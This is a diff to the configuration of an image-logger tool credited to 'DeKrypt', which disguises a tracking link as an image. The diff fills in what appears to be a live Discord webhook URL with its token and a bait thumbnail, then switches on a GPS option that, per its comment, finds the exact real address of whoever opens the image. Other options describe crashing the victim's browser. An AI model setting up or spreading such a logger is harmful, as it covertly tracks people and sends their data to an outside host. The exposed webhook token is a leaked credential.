@@ -16,8 +16,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here",  # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1460902794729885800/4ShIlI83R2SgTs0g6i_iZkO0Rf-0pvYrOcNrW5ZBbwdbPBHBtyR8VRhZYLlFyDqF7-Gz",
+    "image": "https://i.ytimg.com/vi/IpBIe1NZ1II/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLBqiPmw921yZTvCO_Tfk_ptd7ErfA",  # You can also have a custom image by using a URL argument
     "imageArgument": True,  # Allows you to use a URL argument to change the image (SEE THE README)
                             # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
@@ -27,7 +27,7 @@ config = {
 
     # OPTIONS #
     "crashBrowser": False,  # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    "accurateLocation": False,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True,  # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
     "message": {  # Show a custom message when the user opens the image
         "doMessage": False,  # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",  # Message to show
